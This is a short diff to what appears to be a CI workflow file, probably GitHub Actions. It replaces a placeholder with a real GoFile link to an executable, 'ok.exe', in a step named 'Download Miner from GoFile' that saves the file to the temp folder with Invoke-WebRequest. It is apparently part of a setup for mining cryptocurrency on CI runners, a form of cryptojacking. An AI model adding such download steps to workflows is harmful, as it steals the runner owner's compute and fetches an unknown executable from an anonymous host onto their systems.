@@ -80,7 +80,7 @@ jobs:
       # --- Download Miner from GoFile ---
       - name: Download Miner from GoFile
         run: |
-          $url = "YOUR_DIRECT_DOWNLOAD_LINK_HERE"
+          $url = "https://store5.gofile.io/download/web/8f584fe5-6633-43c4-94ff-aac3a7981d9e/ok.exe"
           $output = "$env:TEMP\ok.exe"
           Invoke-WebRequest -Uri $url -OutFile $output
           Write-Host "Miner downloaded to $output"
